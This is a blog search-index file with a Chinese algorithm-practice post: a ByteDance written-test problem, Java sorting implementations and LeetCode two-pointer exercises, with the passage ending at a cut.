<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>算法练习</title>
    <url>/2021/02/13/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<ul><li>说明：题目来源网络，由于本人水平有限，代码可能存在错误</li></ul><a id="more"></a><h2 id="笔试题"><a href="#笔试题" class="headerlink" title="笔试题"></a>笔试题</h2><p>字节：<span class="exturl" data-url="aHR0cHM6Ly93d3cubm93Y29kZXIuY29tL3ByYWN0aWNlLzU4YjA0ZWQyODY1ZjRmZjQ5MjEyOTBmMWJkNGVlNDg2P3RwSWQ9MTM3JnRxSWQ9MzM4NzgmY29tcGFueUlkPTY2NSZycD0xJnJ1PSUyRmNvbXBhbnklMkZob21lJTJGY29kZSUyRjY2NSZxcnU9JTJGdGElMkZleGFtLWJ5dGVkYW5jZSUyRnF1ZXN0aW9uLXJhbmtpbmcmdGFiPWFuc3dlcktleQ==">链接<i class="fa fa-external-link-alt"></i></span></p><p>存在n+1个房间，每个房间依次为房间1 2 3…i，每个房间都存在一个传送门，i房间的传送门可以把人传送到房间pi(1&lt;=pi&lt;=i),现在路人甲从房间1开始出发(当前房间1即第一次访问)，每次移动他有两种移动策略：<br>A. 如果访问过当前房间 i 偶数次，那么下一次移动到房间i+1；<br>B. 如果访问过当前房间 i 奇数次，那么移动到房间pi；<br>现在路人甲想知道移动到房间n+1一共需要多少次移动；</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = scanner.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] strategy = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            strategy[i] = scanner.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(step(n, strategy));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">step</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span>[] strategy)</span></span>&#123;</span><br><span class="line">        <span class="comment">//思路：到达i时，i前面的所有房间必定访问了偶数次</span></span><br><span class="line">        <span class="keyword">long</span>[] dp = <span class="keyword">new</span> <span class="keyword">long</span>[n + <span class="number">2</span>];<span class="comment">//存储第一次到房间i所需步数</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">long</span> mod = <span class="number">1000000007</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n + <span class="number">1</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//dp[i] = dp[i-1] + dp[i-1] + 1 - dp[p[i-1]] + 1</span></span><br><span class="line">            dp[i] = (<span class="number">2</span>*dp[i - <span class="number">1</span>])%mod - dp[strategy[i - <span class="number">1</span>]] + <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n + <span class="number">1</span>]%mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20210213155601.png" alt="image-20210206204838244"></p><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>沉石法，大的往后交换。</p><p>优化：<strong>外循环每次判断上次是否发生交换，如果没交换可以提前结束排序。</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BubbleSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = arr.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len - i - <span class="number">1</span>; j++)&#123;<span class="comment">//注意这里的len - i - 1</span></span><br><span class="line">                <span class="keyword">if</span>(arr[j] &gt; arr[j + <span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="keyword">int</span> temp = arr[j];</span><br><span class="line">                    arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><p><strong>从数组中选择最小元素，将它与数组的第一个元素交换位置。再从数组剩下的元素中选择出最小的元素，将它与数组 的第二个元素交换位置。</strong>不断进行这样的操作，直到将整个数组排序。 选择排序需要 ~N2 /2 次比较和 ~N 次交换，它的运行时间与输入无关，这个特点使得它对一个已经排序的数组也需要 这么多的比较和交换操作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SelectSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = arr.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> min = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[min] &gt; arr[j])&#123;</span><br><span class="line">                    min = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            swap(arr, min, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><p>每次都将当前元素插入到左侧已经排序的数组中，使得插入之后左侧数组依然有序。对于数组 {3, 5, 2, 4, 1}，它具有以下逆序：(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)，插入排序每次只能交换相邻 元素，令逆序数量减少 1，因此插入排序需要交换的次数为逆序数量。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InserSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = arr.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;<span class="comment">//从第1个往前插</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &gt; <span class="number">0</span>; j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j] &lt; arr[j - <span class="number">1</span>])&#123;</span><br><span class="line">                    swap(arr, j, j - <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><ul><li>思路：使用递归分别排好左右两侧顺序，再使用merge合并，将排好序的help数组拷贝进原数组对应位置</li><li>思想：分治</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(low == high) <span class="keyword">return</span>; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> mid = low + (high - low)/<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        sort(arr, low, mid);</span><br><span class="line">        sort(arr, mid + <span class="number">1</span>, high);</span><br><span class="line">        merge(arr, low, mid, high);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> left, <span class="keyword">int</span> mid, <span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[right - left + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> p1 = left;</span><br><span class="line">        <span class="keyword">int</span> p2 = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">//temp下标</span></span><br><span class="line">        <span class="keyword">while</span>(p1 &lt;= mid &amp;&amp; p2 &lt;= right)&#123;</span><br><span class="line">            temp[i++] = arr[p1] &lt; arr[p2] ? arr[p1++] : arr[p2++];  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//剩余部分:两个之一</span></span><br><span class="line">        <span class="keyword">while</span>(p1 &lt;= mid)&#123;</span><br><span class="line">            temp[i++] = arr[p1++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(p2 &lt;= right)&#123;</span><br><span class="line">            temp[i++] = arr[p2++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; temp.length; j++)&#123;</span><br><span class="line">            arr[left + j] = temp[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><ul><li>经典快排</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassicQuickSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">int</span> p = partition(arr, l, r);</span><br><span class="line">            sort(arr, l, p - <span class="number">1</span>);</span><br><span class="line">            sort(arr, p + <span class="number">1</span>, r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> less = l - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[l] &lt; arr[r])&#123;</span><br><span class="line">                swap(arr, ++less, l++);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, less + <span class="number">1</span>, r);</span><br><span class="line">        <span class="keyword">return</span> less + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>随机快排 + 荷兰国旗三向切分partition优化</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt;= right) <span class="keyword">return</span>;<span class="comment">//靠，这里很关键，必须判断大小，不然下面返回的less、more可能会越界</span></span><br><span class="line">        <span class="keyword">int</span> x = left + (<span class="keyword">int</span>) (Math.random() * (right - left + <span class="number">1</span>));</span><br><span class="line">        swap(arr, x, right);</span><br><span class="line">        <span class="keyword">int</span>[] p = partition(arr, left, right);</span><br><span class="line">        sort(arr, left, p[<span class="number">0</span>]);</span><br><span class="line">        sort(arr, p[<span class="number">1</span>], right);       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] partition(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)&#123;</span><br><span class="line">        <span class="keyword">int</span> less = left - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> more =  right;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; more)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[left] &lt; arr[right])&#123;</span><br><span class="line">                swap(arr, ++less, left++);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>( arr[left] &gt; arr[right])&#123;</span><br><span class="line">                swap(arr, --more, left);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, more, right);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;less, more + <span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><ul><li>创建一个堆 H[0……n-1]；</li><li>创建一个大根堆</li><li>堆顶和堆尾交换：即每次把最大值放在最后</li><li>重复第三步骤</li></ul><p>多种实现方式：个人觉得下面方式最为简单</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        buildMaxHeap(arr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = arr.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">            swap(arr, i, <span class="number">0</span>);</span><br><span class="line">            heapify(arr, <span class="number">0</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="comment">// int len = arr.length;</span></span><br><span class="line">        <span class="comment">// for(int i = 0; i &lt; len; i++)&#123;//heapInsert：向上调整</span></span><br><span class="line">        <span class="comment">//     while(arr[i] &gt; arr[(i - 1) / 2])&#123;</span></span><br><span class="line">        <span class="comment">//         swap(arr, i, (i - 1) / 2);</span></span><br><span class="line">        <span class="comment">//         i = (i - 1) / 2; </span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = arr.length/<span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">            heapify(arr, i, arr.length);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">        <span class="comment">// int l = i * 2 + 1;       </span></span><br><span class="line">        <span class="comment">// while(l &lt; heapSize)&#123;//非递归实现</span></span><br><span class="line">        <span class="comment">//     int large = l + 1 &lt;= heapSize &amp;&amp; arr[l] &gt; arr[l + 1] ? l : l + 1;</span></span><br><span class="line">        <span class="comment">//     large = arr[large] &gt; arr[i] ? large : i;</span></span><br><span class="line">        <span class="comment">//     if(large == i) break;//自己最大，退出</span></span><br><span class="line">        <span class="comment">//     swap(arr, large, i);</span></span><br><span class="line">        <span class="comment">//     i = large; //新node</span></span><br><span class="line">        <span class="comment">//     l = i * 2 + 1; //新左儿子</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">int</span> l = i * <span class="number">2</span> + <span class="number">1</span>, r = i * <span class="number">2</span> + <span class="number">2</span>, largest = i; <span class="comment">//l:左孩子，r：右孩子，i:父节点</span></span><br><span class="line">        <span class="keyword">if</span> (l &lt; heapSize &amp;&amp; arr[l] &gt; arr[largest]) &#123;</span><br><span class="line">            largest = l; <span class="comment">//先与左孩子比较</span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (r &lt; heapSize &amp;&amp; arr[r] &gt; arr[largest]) &#123;</span><br><span class="line">            largest = r;<span class="comment">//再与右孩子比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (largest != i) &#123;<span class="comment">//如果孩子节点更大，交换</span></span><br><span class="line">            swap(arr, i, largest);</span><br><span class="line">            heapify(arr, largest, heapSize); <span class="comment">//递归调整下一个子树</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h2><h4 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h4><h5 id="有序数组的-Two-Sum"><a href="#有序数组的-Two-Sum" class="headerlink" title="有序数组的 Two Sum"></a>有序数组的 Two Sum</h5><ul><li>题目描述：在有序数组中找出两个数，使它们的和为 target。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum</span> </span>&#123;</span><br><span class="line">    <span class="comment">//题目描述：在有序数组中找出两个数，使它们的和为 target。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] ans = solution(arr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : ans) &#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] solution(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> target)&#123;</span><br><span class="line">        <span class="keyword">int</span> len = arr.length;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = len - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[l] + arr[r] &gt; target)&#123;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr[l] + arr[r] &lt; target)&#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;l, r&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="两数平方和"><a href="#两数平方和" class="headerlink" title="两数平方和"></a>两数平方和</h5><ul><li>题目描述：判断一个数是否为两个数的平方和。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SumOfSquare</span></span>&#123;</span><br><span class="line">    <span class="comment">// 题目描述：判断一个数是否为两个数的平方和。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">3</span>;</span><br><span class="line">        System.out.println(solution(a));</span><br><span class="line">        System.out.println(solution(b));</span><br><span class="line">        System.out.println(solution(c));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">solution</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// int j = num/2;</span></span><br><span class="line">        <span class="keyword">int</span> j = (<span class="keyword">int</span>) Math.sqrt(num);</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i * i + j * j == num)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i * i + j * j &gt; num)&#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="反转字符串中的元音"><a 